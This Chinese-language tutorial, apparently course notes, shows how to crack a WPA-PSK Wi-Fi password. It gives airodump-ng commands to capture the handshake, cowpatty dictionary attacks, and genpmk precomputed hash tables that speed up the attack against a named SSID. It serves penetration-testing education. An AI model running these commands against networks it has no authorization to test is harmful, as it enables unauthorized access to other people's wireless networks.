# WPA破解-创建Hash-table加速并用Cowpatty破解

## 1.Cowpatty 软件介绍

CoWPAtty是WPA-PSK的自动字典攻击工具，它运行在Linux上，该程序具有命令行界面，并使用字典进行密码攻击。

## 2.渗透流程

### 1.安装CoWPAtty

```
cowpatty
```

![image-20211209152646289](https://img.gyxnb.top/img/image-20211209152646289.png)

### 2.抓握手包

```
airodump-ng wlan0mon -c 1 --bssid D8:24:BD:79:18:0B -w wpa-1 
-c:指定信道
--bssid:AP的MAC地址
-w:保存抓包结果
```

### 3.重新连接wifi

### 4.渗透WPA wifi

```
cowpatty -f /root/wifi/passwd.txt -r  wpa-1-01.cap -s cisco-1809
-f:字典文件
-r:数据包捕获文件
-s:网络SSID（如果SSID包含空格，则使用引号括起来）
```

![image-20211209152816034](https://img.gyxnb.top/img/image-20211209152816034.png)

### 5.使用大字典破解

```
cowpatty -f /root/wifi/pwd.txt -r  wpa-1-01.cap -s cisco-1809
```

![image-20211209152848877](https://img.gyxnb.top/img/image-20211209152848877.png)

## 3.hash-table加速

### 1.将密码字典生成hash-table

```
genpmk -f  pwd.txt -d ./pwdhash -s cisco-1809
```

![image-20211209153002704](https://img.gyxnb.top/img/image-20211209153002704.png)

生成hask-table速度比较慢，但是具有可传播性，大家如果跟我视频设置的是一样的wifi名称和一样的密码规则，可以直接使用而课程附件里生成好的hash-table直接破解

### 2.加速渗透

```
cowpatty -d /root/wifi/pwdhash -r  wpa-1-01.cap -s cisco-1809
```

![image-20211209153101178](https://img.gyxnb.top/img/image-20211209153101178.png)

## 4.课程小结

参考：课后笔记